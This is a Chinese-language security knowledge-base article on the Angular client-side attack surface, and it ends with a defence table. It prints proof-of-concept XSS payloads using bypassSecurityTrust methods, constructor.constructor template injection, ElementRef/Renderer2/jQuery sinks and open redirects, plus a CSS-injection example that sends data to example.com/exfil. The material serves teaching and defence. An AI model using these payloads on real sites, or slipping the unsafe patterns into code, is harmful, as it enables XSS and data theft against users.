---
attack_surface:
  - 客户端利用
  - 配置缺陷
  - 注入类
impact:
  - 信息泄露
  - 身份伪造
  - 远程代码执行
risk_level: 中
prerequisites:
  - TypeScript 与 Angular 框架基础
  - DOM API 与浏览器安全模型
  - XSS / Open Redirect 基础概念
related_techniques:
  - dom-xss
  - open-redirect
  - template-injection
  - csp-bypass
  - sourcemap-leak
difficulty: 中级
tools:
  - browser-devtools
  - burp-suite
---

# Angular — Angular Client-Side Framework Attack Surface — Angular 前端框架攻击面

> 关联文档：[DOM XSS](../../../pentesting-web/xss-cross-site-scripting/dom-xss.html) · [XSS in Angular (PayloadsAllTheThings)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md) · [CSP Bypass](../../User%20input/HTTP%20Headers/CSP%20Bypass/README.md) · [Open Redirect](../../User%20input/Reflected%20Values/Open%20Redirect/README.md)

---

### 知识路径

```
Angular Security（本文档）
  ├── 前置知识：TypeScript — 类型系统、装饰器、依赖注入
  ├── 前置知识：Angular 架构 — Component、Module、Router、Service
  ├── 进阶：BypassSecurityTrust 方法滥用 → XSS
  ├── 进阶：Template Injection（CSR + SSR）→ 代码执行
  ├── 关联：DOM XSS — Angular ElementRef / Renderer2 / jQuery sinks
  │   └── 参见：xss-cross-site-scripting/dom-xss
  ├── 关联：Open Redirect — window.location / Angular Document / Router
  │   └── 参见：User input/Reflected Values/Open Redirect
  └── 关联：Sourcemap 泄露 → TypeScript 源码暴露
```

---

# 0x01 Angular 架构与安全模型

## 1.1 安全清单

来自 [Angular Security Checklist](https://lsgeurope.com/post/angular-security-checklist)：

- [ ] Angular 是客户端框架，不应被期望提供服务器端保护
- [ ] 项目中 Sourcemap 已禁用
- [ ] 不可信用户输入在模板中使用前始终经过插值或净化
- [ ] 用户无法控制服务端或客户端模板
- [ ] 不可信用户输入在应用信任前使用适当的安全上下文进行了净化
  - [ ] `BypassSecurity*` 方法不用于不可信输入
- [ ] 不可信用户输入不传递给 `ElementRef`、`Renderer2`、`Document` 或 JQuery/DOM sinks

## 1.2 框架架构

Angular 是由 Google 维护的前端框架，使用 TypeScript 增强代码可读性和调试能力。具有强安全机制，默认防止 XSS 和 Open Redirect 等常见客户端漏洞。

```bash
my-workspace/
├── src
│   ├── app
│   │   ├── app.module.ts       # 根模块，告诉 Angular 如何组装应用
│   │   ├── app.component.ts    # 根组件逻辑
│   │   ├── app.component.html  # 根组件 HTML 模板
│   │   ├── app.component.css   # 根组件样式
│   │   └── app-routing.module.ts # 路由
│   ├── index.html              # 主 HTML 页面
├── angular.json                # 工作区配置
└── tsconfig.json               # TypeScript 配置
```

每个组件由 `@Component()` 装饰器标识，通过 `AppModule`（根模块）启动。`Router` 管理导航，`Service`（`@Injectable()`）处理跨组件共享逻辑。

## 1.3 安全模型

Angular 默认对所有数据进行编码或净化，使 XSS 难以利用。两种数据处理场景：

1. **插值** `{{user_input}}` — 执行上下文敏感的编码，将用户输入解释为文本
2. **属性绑定** `[attribute]="user_input"` — 基于提供的安全上下文执行净化

6 种 `SecurityContext`：`None`、`HTML`、`STYLE`、`URL`、`SCRIPT`、`RESOURCE_URL`。

---

# 0x02 Sourcemap 配置

Angular 通过 `tsconfig.json` 编译 TypeScript，通过 `angular.json` 构建项目。默认配置启用 Sourcemap：

```json
"sourceMap": {
    "scripts": true,
    "styles": true,
    "vendor": false,
    "hidden": false
}
```

Sourcemap 用于调试，映射生成文件到原始 TypeScript 文件。**生产环境不应启用**。若启用，可在浏览器 DevTools → Sources → `[id].main.js` 中找到编译后的 JavaScript，文件末尾可能包含 `//# sourceMappingURL=[id].main.js.map`。若 `hidden` 设为 `true`，该行不出现但 Sourcemap 仍存在。

构建时可通过 `ng build --source-map` 显式启用。即使 Sourcemap 禁用，仍可手动分析编译后的 JavaScript 文件。

---

# 0x03 数据绑定

绑定是组件与视图之间的通信机制，通过事件、插值、属性或双向绑定传递数据。

| 类型 | 目标 | 示例 |
|------|------|------|
| Property | Element/Component/Directive 属性 | `<img [src]="heroImageUrl">` |
| Event | Element/Component/Directive 事件 | `<button (click)="onSave()">Save` |
| Two-way | 事件 + 属性 | `<input [(ngModel)]="name">` |
| Attribute | 属性（例外） | `<button [attr.aria-label]="help">` |
| Class | class 属性 | `<div [class.special]="isSpecial">` |
| Style | style 属性 | `<button [style.color]="isSpecial ? 'red' : 'green'">` |

---

# 0x04 Bypass Security Trust 方法

Angular 提供 5 种绕过默认净化机制的方法，指示某个值在特定上下文中可安全使用。**绝不可对不可信输入使用**。

### 4.1 `bypassSecurityTrustUrl`

```ts
this.trustedUrl = this.sanitizer.bypassSecurityTrustUrl('javascript:alert()');
```
```html
<a class="e2e-trusted-url" [href]="trustedUrl">Click me</a>
```
结果：`<a href="javascript:alert()">Click me</a>`

### 4.2 `bypassSecurityTrustResourceUrl`

```ts
this.trustedResourceUrl = this.sanitizer.bypassSecurityTrustResourceUrl("https://www.google.com/...png");
```
```html
<iframe [src]="trustedResourceUrl"></iframe>
```

### 4.3 `bypassSecurityTrustHtml`

```ts
this.trustedHtml = this.sanitizer.bypassSecurityTrustHtml("<h1>html tag</h1><svg onclick=\"alert('bypassSecurityTrustHtml')\" style=display:block>blah</svg>");
```
```html
<p style="border:solid" [innerHtml]="trustedHtml"></p>
```
结果：`<h1>html tag</h1><svg onclick="alert('bypassSecurityTrustHtml')">blah</svg>`

> **注意**：以此方式将 `<script>` 元素插入 DOM 树**不会执行**其中的 JavaScript 代码，因为 Angular 限制了脚本元素的 DOM 添加方式。

### 4.4 `bypassSecurityTrustScript`

```ts
this.trustedScript = this.sanitizer.bypassSecurityTrustScript("alert('bypass Security TrustScript')");
```
```html
<script [innerHtml]="trustedScript"></script>
```
行为不可预测 — 无法通过此方法在模板中执行 JS 代码。

### 4.5 `bypassSecurityTrustStyle` — CSS 注入

```ts
this.trustedStyle = this.sanitizer.bypassSecurityTrustStyle('background-image: url(https://example.com/exfil/a)');
```
```html
<input type="password" name="pwd" value="01234" [style]="trustedStyle">
```
结果：向 `example.com/exfil/a` 发出 GET 请求，泄露数据。

---

# 0x05 HTML 注入

当用户输入绑定到 `innerHTML`、`outerHTML` 或 `iframe` `srcdoc` 时发生。输入经 `SecurityContext.HTML` 净化 — HTML 注入可能，但 XSS 不可行。

```ts
// app.component.ts
test = "<script>alert(1)</script><h1>test</h1>";
```
```html
<div [innerHTML]="test"></div>
```
结果：`<div><h1>test</h1></div>` — `<script>` 被移除。

> **关键**：使用 `SecurityContext.URL` 净化器处理 HTML 内容不能防御危险的 HTML 值。安全上下文的不当使用可导致 XSS。

---

# 0x06 模板注入

## 6.1 Client-Side Rendering (CSR)

Angular 用双花括号 `{{}}` 包裹模板表达式进行求值。`{{1+1}}` 显示为 `2`。

Angular 默认转义可被混淆为模板表达式的字符（`< > ' " \``）。要绕过，需使用生成 JavaScript 字符串对象的函数来避免黑名单字符：

```ts
const _userInput = '{{constructor.constructor(\'alert(1)\'()}}'
@Component({
    selector: 'app-root',
    template: '<h1>title</h1>' + _userInput
})
```

`constructor` 引用 Object 的 `constructor` 属性，使我们能调用 String 构造器并执行任意代码。

## 6.2 Server-Side Rendering (SSR) — Angular Universal

Angular Universal 负责模板文件的 SSR，应用与 CSR 相同的净化机制。SSR 中的模板注入漏洞发现方式与 CSR 相同——使用的模板语言一致。使用第三方模板引擎（Pug、Handlebars）时可能引入新的注入漏洞。

---

# 0x07 XSS via DOM 接口

## 7.1 `document.write()` / `document.createElement()`

```ts
// 方式 1：document.write
document.open();
document.write("<script>alert(document.domain)</script>");
document.close();

// 方式 2：createElement + appendChild
var d = document.createElement('script');
var y = document.createTextNode("alert(1)");
d.appendChild(y);
document.body.appendChild(d);

// 方式 3：img onerror
var a = document.createElement('img');
a.src='1';
a.setAttribute('onerror','alert(1)');
document.body.appendChild(a);
```

## 7.2 Angular 类 — `ElementRef`

`ElementRef` 包含 `nativeElement` 属性，可直接操作 DOM 元素。不当使用可导致 XSS：

```ts
constructor(private elementRef: ElementRef) {
    const s = document.createElement('script');
    s.type = 'text/javascript';
    s.textContent = 'alert("Hello World")';
    this.elementRef.nativeElement.appendChild(s);
}
```

## 7.3 Angular 类 — `Renderer2`

`Renderer2` 在 DOM 元素和组件代码之间提供抽象层，但其 `setAttribute()` 方法无 XSS 防护：

```ts
// setAttribute 无防护
this.renderer2.setAttribute(this.img.nativeElement, 'src', '1');
this.renderer2.setAttribute(this.img.nativeElement, 'onerror', 'alert(1)');
```

`setProperty()` 同样可触发 XSS：

```ts
// setProperty 设置 innerHTML
this.renderer2.setProperty(this.img.nativeElement, 'innerHTML', '<img src=1 onerror=alert(1)>');
```

> **注意**：`Renderer2` 的其他方法（`setStyle()`、`createComment()`、`setValue()`）经过研究未发现有效的 XSS/CSS 注入向量，受功能限制。

## 7.4 jQuery 集成

Angular 项目中可使用 jQuery，但其方法可被利用实现 XSS。

**`html()` 方法** — 接受 HTML 字符串的 jQuery 构造器或方法可能执行代码：

```ts
$("p").html("<script>alert(1)</script>");
```

**`jQuery.parseHTML()`** — 默认不执行脚本（除非 `keepScripts` 为 `true`），但仍可通过 `<img onerror>` 间接执行：

```ts
var str = "<img src=1 onerror=alert(1)>",
    html = $.parseHTML(str);
$palias.append(html);
```

---

# 0x08 Open Redirect

## 8.1 DOM 接口

`window.location` 和 `document.location` 在现代浏览器中互为别名。

**`window.location.href`：**

```ts
window.location.href = "https://google.com/about"
```

**`window.location.assign()`：**

```ts
window.location.assign("https://google.com/about")
```

**`window.location.replace()`：** 与 `assign()` 不同，当前页不会保存在会话历史中，但同样可利用：

```ts
window.location.replace("http://google.com/about")
```

**`window.open()`：**

```ts
window.open("https://google.com/about", "_blank")
```

## 8.2 Angular `Document`

Angular `Document` 与 DOM document 相同，可被用于 Open Redirect：

```ts
import { DOCUMENT } from '@angular/common';
constructor(@Inject(DOCUMENT) private document: Document) { }
goToUrl(): void {
    this.document.location.href = 'https://google.com/about';
}
```

## 8.3 Angular `Location`

`Location` 服务的方法（`go()`、`replaceState()`、`prepareExternalUrl()`）**不能**用于重定向到外部域：

```ts
this.location.go("http://google.com/about")
// 结果：http://localhost:4200/http://google.com/about
```

## 8.4 Angular `Router`

`Router` 主要用于同域导航，不引入额外漏洞：

```ts
const routes: Routes = [
  { path: '', redirectTo: 'https://google.com', pathMatch: 'full' }
]
// 结果：http://localhost:4200/https:
```

以下方法同样限制在同域内：`this.router.navigate(['PATH'])`、`this.router.navigateByUrl('URL')`。

---

# 0x09 防御

| 措施 | 理由 |
|------|------|
| 生产环境禁用 Sourcemap（`"sourceMap": {"scripts": false, "hidden": true}`） | 防止 TypeScript 源码泄露 |
| 绝不对不可信输入使用 `BypassSecurityTrust*` 方法 | 这些方法绕过 Angular 内置净化 |
| 使用正确的 `SecurityContext` 进行净化 — HTML 内容用 `SecurityContext.HTML` | 防止安全上下文误用导致 XSS |
| 避免直接使用 `ElementRef.nativeElement` 操作 DOM | 绕过 Angular 安全抽象层 |
| 使用 `Renderer2` 时避免 `setAttribute()` 传入用户可控值 | 该方法无 XSS 防护 |
| 避免在 Angular 项目中使用 jQuery 的 `html()` 方法处理不可信输入 | jQuery 不继承 Angular 净化 |
| 对 `window.location.href` 赋值前验证 URL 为相对路径或白名单域名 | 防止 Open Redirect |
| 升级 Angular 至最新版本 | 安全修复 |

## 参考资料

- [Angular Security: The Definitive Guide (Part 1)](https://lsgeurope.com/post/angular-security-the-definitive-guide-part-1)
- [Angular Security: The Definitive Guide (Part 2)](https://lsgeurope.com/post/angular-security-the-definitive-guide-part-2)
- [Angular Security: The Definitive Guide (Part 3)](https://lsgeurope.com/post/angular-security-the-definitive-guide-part-3)
- [Angular Security Checklist](https://lsgeurope.com/post/angular-security-checklist)
- [Angular 官方 — 安全与净化上下文](https://angular.io/guide/security#sanitization-and-security-contexts)
- [Angular 官方 — Sourcemap 配置](https://angular.io/guide/workspace-config#source-map-configuration)
- [XSS in Angular — PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md)
